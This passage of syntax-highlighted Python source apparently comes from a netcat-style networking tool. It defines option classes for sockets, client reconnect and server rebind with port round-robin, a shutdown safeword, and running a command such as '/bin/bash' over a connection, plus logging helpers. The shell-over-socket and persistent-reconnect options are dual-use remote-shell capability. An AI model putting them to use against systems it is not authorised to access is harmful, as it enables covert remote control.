<span class="hljs-class"><span class="hljs-keyword">class</span> <span
        class="hljs-title">DsSock</span>(<span class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for DsSock options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bufsize</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: Receive buffer size."""</span>
        <span class="hljs-keyword">return</span> self.__bufsize

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backlog</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: Listen backlog."""</span>
        <span class="hljs-keyword">return</span> self.__backlog

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_timeout</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[float]</span>
        <span class="hljs-string">"""`float` or `None`: Receive timeout to change blocking socket to time-out based."""</span>
        <span class="hljs-keyword">return</span> self.__recv_timeout

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">nodns</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if we resolve hostnames or not."""</span>
        <span class="hljs-keyword">return</span> self.__nodns

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ipv4</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Only use IPv4 instead of both, IPv4 and IPv6."""</span>
        <span class="hljs-keyword">return</span> self.__ipv4

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ipv6</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Only use IPv6 instead of both, IPv4 and IPv6."""</span>
        <span class="hljs-keyword">return</span> self.__ipv6

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">src_addr</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`bool`: Custom source address for connect mode."""</span>
        <span class="hljs-keyword">return</span> self.__src_addr

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">src_port</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[int]</span>
        <span class="hljs-string">"""`bool`: Custom source port for connect mode."""</span>
        <span class="hljs-keyword">return</span> self.__src_port

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">udp</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if we use TCP or UDP."""</span>
        <span class="hljs-keyword">return</span> self.__udp

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_sconnect</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if we use stateful connect for UDP."""</span>
        <span class="hljs-keyword">return</span> self.__udp_sconnect

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_sconnect_word</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""`str`: What string to send when emulating a stateful UDP connect."""</span>
        <span class="hljs-keyword">return</span> self.__udp_sconnect_word

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ip_tos</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`str`: Determines what IP_TOS (Type of Service) value to set for the socket."""</span>
        <span class="hljs-keyword">return</span> self.__ip_tos

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">info</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`str`: Determines what info to display about the socket connection."""</span>
        <span class="hljs-keyword">return</span> self.__info

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        bufsize,  <span class="hljs-comment"># type: int</span>
        backlog,  <span class="hljs-comment"># type: int</span>
        recv_timeout,  <span class="hljs-comment"># type: Optional[float]</span>
        nodns,  <span class="hljs-comment"># type: bool</span>
        ipv4,  <span class="hljs-comment"># type: bool</span>
        ipv6,  <span class="hljs-comment"># type: bool</span>
        src_addr,  <span class="hljs-comment"># type: Optional[str]</span>
        src_port,  <span class="hljs-comment"># type: Optional[int]</span>
        udp,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect_word,  <span class="hljs-comment"># type: str</span>
        ip_tos,  <span class="hljs-comment"># type: Optional[str]</span>
        info,  <span class="hljs-comment"># type: str</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(bufsize) <span class="hljs-keyword">is</span> int, type(bufsize)
        <span class="hljs-keyword">assert</span> type(backlog) <span class="hljs-keyword">is</span> int, type(backlog)
        <span class="hljs-keyword">assert</span> type(recv_timeout) <span
                            class="hljs-keyword">is</span> float, type(recv_timeout)
        <span class="hljs-keyword">assert</span> type(nodns) <span class="hljs-keyword">is</span> bool, type(nodns)
        <span class="hljs-keyword">assert</span> type(ipv4) <span class="hljs-keyword">is</span> bool, type(ipv4)
        <span class="hljs-keyword">assert</span> type(ipv6) <span class="hljs-keyword">is</span> bool, type(ipv6)
        <span class="hljs-keyword">assert</span> type(src_addr) <span class="hljs-keyword">is</span> str <span
                            class="hljs-keyword">or</span> src_addr <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>, type(src_addr)
        <span class="hljs-keyword">assert</span> type(src_port) <span class="hljs-keyword">is</span> int <span
                            class="hljs-keyword">or</span> src_port <span
                            class="hljs-keyword">is</span> <span class="hljs-literal">None</span>, type(src_port)
        <span class="hljs-keyword">assert</span> type(udp) <span class="hljs-keyword">is</span> bool, type(udp)
        self.__bufsize = bufsize
        self.__backlog = backlog
        self.__recv_timeout = recv_timeout
        self.__nodns = nodns
        self.__ipv4 = ipv4
        self.__ipv6 = ipv6
        self.__src_addr = src_addr
        self.__src_port = src_port
        self.__udp = udp
        self.__udp_sconnect = udp_sconnect
        self.__udp_sconnect_word = udp_sconnect_word
        self.__ip_tos = ip_tos
        self.__info = info


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (6/12) DsIONetworkSock</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsIONetworkSock</span>(<span
        class="hljs-params">DsSock</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IONetwork socket options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_timeout_retry</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: How many times to retry receiving if stop signal was raised."""</span>
        <span class="hljs-keyword">return</span> self.__recv_timeout_retry

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        bufsize,  <span class="hljs-comment"># type: int</span>
        backlog,  <span class="hljs-comment"># type: int</span>
        recv_timeout,  <span class="hljs-comment"># type: Optional[float]</span>
        recv_timeout_retry,  <span class="hljs-comment"># type: int</span>
        nodns,  <span class="hljs-comment"># type: bool</span>
        ipv4,  <span class="hljs-comment"># type: bool</span>
        ipv6,  <span class="hljs-comment"># type: bool</span>
        src_addr,  <span class="hljs-comment"># type: Optional[str]</span>
        src_port,  <span class="hljs-comment"># type: Optional[bool]</span>
        udp,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect_word,  <span class="hljs-comment"># type: str</span>
        ip_tos,  <span class="hljs-comment"># type: Optional[str]</span>
        info,  <span class="hljs-comment"># type: str</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(recv_timeout_retry) <span
                            class="hljs-keyword">is</span> int, type(recv_timeout_retry)
        self.__recv_timeout_retry = recv_timeout_retry
        super(DsIONetworkSock, self).__init__(
            bufsize,
            backlog,
            recv_timeout,
            nodns,
            ipv4,
            ipv6,
            src_addr,
            src_port,
            udp,
            udp_sconnect,
            udp_sconnect_word,
            ip_tos,
            info,
        )


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (7/12) DsIONetworkCli</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsIONetworkCli</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IONetwork client options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: If connection fails, retry endless (if negative) or x many times."""</span>
        <span class="hljs-keyword">return</span> self.__reconn

<span class="hljs-meta">    @reconn.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> int, type(value)
        self.__reconn = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_wait</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; float</span>
        <span class="hljs-string">"""`float`: Wait time between re-connections in seconds."""</span>
        <span class="hljs-keyword">return</span> self.__reconn_wait

<span class="hljs-meta">    @reconn_wait.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_wait</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (float) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> float, type(value)
        self.__reconn_wait = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_robin</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[int]</span>
        <span class="hljs-string">"""`[int]`: List of alternating re-connection ports."""</span>
        <span class="hljs-keyword">return</span> self.__reconn_robin

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, reconn, reconn_wait, reconn_robin</span>):</span>
        <span class="hljs-comment"># type: (int, float, List[int]) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(reconn) <span class="hljs-keyword">is</span> int, type(reconn)
        <span class="hljs-keyword">assert</span> type(reconn_wait) <span
                            class="hljs-keyword">is</span> float, type(reconn_wait)
        <span class="hljs-keyword">assert</span> type(reconn_robin) <span
                            class="hljs-keyword">is</span> list, type(reconn_robin)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> reconn_robin:
            <span class="hljs-keyword">assert</span> type(i) <span class="hljs-keyword">is</span> int, type(i)
        self.__reconn = reconn
        self.__reconn_wait = reconn_wait
        self.__reconn_robin = reconn_robin


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (8/12) DsIONetworkSrv</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsIONetworkSrv</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IONetwork server options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep_open</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Accept new clients if one has disconnected."""</span>
        <span class="hljs-keyword">return</span> bool(self.__keep_open)

<span class="hljs-meta">    @keep_open.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep_open</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (bool) -&gt; None</span>
        <span class="hljs-string">"""Change keep_open value."""</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> bool, type(value)
        self.__keep_open = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: If binding fails, retry endless (if negative) or x many times."""</span>
        <span class="hljs-keyword">return</span> self.__rebind

<span class="hljs-meta">    @rebind.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> int, type(value)
        self.__rebind = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind_wait</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; float</span>
        <span class="hljs-string">"""`float`: Wait time between rebinds in seconds."""</span>
        <span class="hljs-keyword">return</span> self.__rebind_wait

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind_robin</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[int]</span>
        <span class="hljs-string">"""`[int]`: List of alternating rebind ports."""</span>
        <span class="hljs-keyword">return</span> self.__rebind_robin

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, keep_open, rebind, rebind_wait, rebind_robin</span>):</span>
        <span class="hljs-comment"># type: (bool, int, float, List[int]) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(keep_open) <span
                            class="hljs-keyword">is</span> bool, type(keep_open)
        <span class="hljs-keyword">assert</span> type(rebind) <span class="hljs-keyword">is</span> int, type(rebind)
        <span class="hljs-keyword">assert</span> type(rebind_wait) <span
                            class="hljs-keyword">is</span> float, type(rebind_wait)
        <span class="hljs-keyword">assert</span> type(rebind_robin) <span
                            class="hljs-keyword">is</span> list, type(rebind_robin)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rebind_robin:
            <span class="hljs-keyword">assert</span> type(i) <span class="hljs-keyword">is</span> int, type(i)
        self.keep_open = keep_open
        self.__rebind = rebind
        self.__rebind_wait = rebind_wait
        self.__rebind_robin = rebind_robin


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (9/12) DsTransformLinefeed</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsTransformLinefeed</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for DsTransformLinefeed options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">crlf</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[str]</span>
        <span class="hljs-string">"""`bool`: Converts line endings to LF, CRLF or CR and noop on `None`."""</span>
        <span class="hljs-keyword">return</span> self.__crlf

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, crlf</span>):</span>
        <span class="hljs-comment"># type: (Optional[str]) -&gt; None</span>
        super(DsTransformLinefeed, self).__init__()
        self.__crlf = crlf


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (10/12) DsTransformSafeword</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsTransformSafeword</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for DsTransformSafeword options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">ssig</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; InterruptHandler</span>
        <span class="hljs-string">"""`InterruptHandler`: InterruptHandler instance to trigger a shutdown signal."""</span>
        <span class="hljs-keyword">return</span> self.__ssig

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">safeword</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""`str`: The safeword to shutdown the instance upon receiving."""</span>
        <span class="hljs-keyword">return</span> self.__safeword

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, ssig, safeword</span>):</span>
        <span class="hljs-comment"># type: (InterruptHandler, str) -&gt; None</span>
        super(DsTransformSafeword, self).__init__()
        self.__ssig = ssig
        self.__safeword = safeword


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (11/12) DsIOStdinStdout</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsIOStdinStdout</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IOStdinStdout options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">enc</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; StringEncoder</span>
        <span class="hljs-string">"""`StringEncoder`: String encoder instance."""</span>
        <span class="hljs-keyword">return</span> self.__enc

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_timeout</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[float]</span>
        <span class="hljs-string">"""`float`: Input timeout in seconds for non-blocking read or `None` for blocking."""</span>
        <span class="hljs-keyword">return</span> self.__input_timeout

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_on_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`float`: Determines if we buffer STDIN until EOF before sending."""</span>
        <span class="hljs-keyword">return</span> self.__send_on_eof

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, encoder, input_timeout, send_on_eof</span>):</span>
        <span class="hljs-comment"># type: (StringEncoder, Optional[float], bool) -&gt; None</span>
        super(DsIOStdinStdout, self).__init__()
        self.__enc = encoder
        self.__input_timeout = input_timeout
        self.__send_on_eof = send_on_eof


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [2/11 DATA STRUCTURE TYPES]: (12/12) DsIOCommand</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DsIOCommand</span>(<span
        class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IOCommand options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">enc</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; StringEncoder</span>
        <span class="hljs-string">"""`StringEncoder`: Instance of StringEncoder."""</span>
        <span class="hljs-keyword">return</span> self.__enc

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">executable</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; str</span>
        <span class="hljs-string">"""`srt`: Name or path of executable to run (e.g.: `/bin/bash`)."""</span>
        <span class="hljs-keyword">return</span> self.__executable

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bufsize</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: `subprocess.Popen` bufsize.

        https://docs.python.org/3/library/subprocess.html#popen-constructor
        0 means unbuffered (read and write are one system call and can return short)
        1 means line buffered (only usable if universal_newlines=True i.e., in a text mode)
        any other positive value means use a buffer of approximately that size
        negative bufsize (the default) means system default of io.DEFAULT_BUFFER_SIZE will be used.
        """</span>
        <span class="hljs-keyword">return</span> self.__bufsize

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, enc, executable, bufsize</span>):</span>
        <span class="hljs-comment"># type: (StringEncoder, str, int) -&gt; None</span>
        self.__enc = enc
        self.__executable = executable
        self.__bufsize = bufsize


<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># ###   3 / 11   L I B R A R Y   C L A S S E S</span>
<span class="hljs-comment"># ###</span>
<span class="hljs-comment"># #################################################################################################</span>
<span class="hljs-comment"># #################################################################################################</span>

<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [3/11 LIBRARY CLASSES]: (1/3) TraceLogger</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TraceLogger</span>(<span
        class="hljs-params">logging.getLoggerClass(<span
        class="hljs-params"></span>)</span>):</span>  <span
                            class="hljs-comment"># type: ignore</span>
    <span class="hljs-string">"""Extend Python's default logger class with TRACE level logging."""</span>

    LEVEL_NUM = <span class="hljs-number">9</span>
    LEVEL_NAME = <span class="hljs-string">"TRACE"</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, name, level=logging.NOTSET</span>):</span>
        <span class="hljs-comment"># type: (str, int) -&gt; None</span>
        <span class="hljs-string">"""Instantiate TraceLogger class.

        Args:
            name (str):  Instance name.
            level (int): Current log level.
        """</span>
        super(TraceLogger, self).__init__(name, level)
        logging.addLevelName(self.LEVEL_NUM, self.LEVEL_NAME)

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">trace</span>(<span
            class="hljs-params">self, msg, *args, **kwargs</span>):</span>
        <span class="hljs-comment"># type: (str, Any, Any) -&gt; None</span>
        <span class="hljs-string">"""Set custom log level for TRACE.

        Args:
            msg (str): The log message.
            args (args): *args for trace level log function.
            kwargs (kwargs): kwargs for trace level log function.
        """</span>
        <span class="hljs-keyword">if</span> self.isEnabledFor(self.LEVEL_NUM):
            <span class="hljs-comment"># Yes, logger takes its '*args' as 'args'.</span>
            self._log(self.LEVEL_NUM, msg, args, **kwargs)


<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-comment"># [3/11 LIBRARY CLASSES]: (2/3) ColoredLogFormatter</span>
<span class="hljs-comment"># -------------------------------------------------------------------------------------------------</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ColoredLogFormatter</span>(<span
        class="hljs-params">logging.Formatter</span>):</span>
    <span class="hljs-string">"""Custom log formatter which adds different details and color support."""</span>

    COLORS = {
        logging.CRITICAL: <span class="hljs-string">"\x1b[31;1m"</span>,  <span
                            class="hljs-comment"># bold red</span>
        logging.ERROR: <span class="hljs-string">"\x1b[31;21m"</span>,  <span class="hljs-comment"># red</span>
        logging.WARNING: <span class="hljs-string">"\x1b[33;21m"</span>,  <span
                            class="hljs-comment"># yellow</span>
        logging.INFO: <span class="hljs-string">"\x1b[32;21m"</span>,  <span class="hljs-comment"># green</span>
        logging.DEBUG: <span class="hljs-string">"\x1b[30;21m"</span>,  <span class="hljs-comment"># gray</span>
    }
    COLOR_DEF = COLORS[logging.DEBUG]
    COLOR_RST = <span class="hljs-string">"\x1b[0m"</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, color, loglevel</span>):</span>
        <span class="hljs-comment"># type: (str, int) -&gt; None</span>
        <span class="hljs-string">"""Instantiate ColoredLogFormatter class.

        Args:
            color (str):  Either be `alway`, `never` or `auto`.
            loglevel (int): Current desired log level.
        """</span>
        super(ColoredLogFormatter, self).__init__()
        self.color = color
        self.loglevel = loglevel
        self.tty = sys.stderr.isatty()

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Public Functions</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">format</span>(<span
            class="hljs-params">self, record</span>):</span>
        <span class="hljs-comment"># type: (logging.LogRecord) -&gt; str</span>
        <span class="hljs-string">"""Apply custom formatting to log message."""</span>
        log_fmt = self.__get_format()
        log_fmt = self.__colorize(record.levelno, log_fmt)
        formatter = logging.Formatter(log_fmt)
        <span class="hljs-keyword">return</span> formatter.format(record)

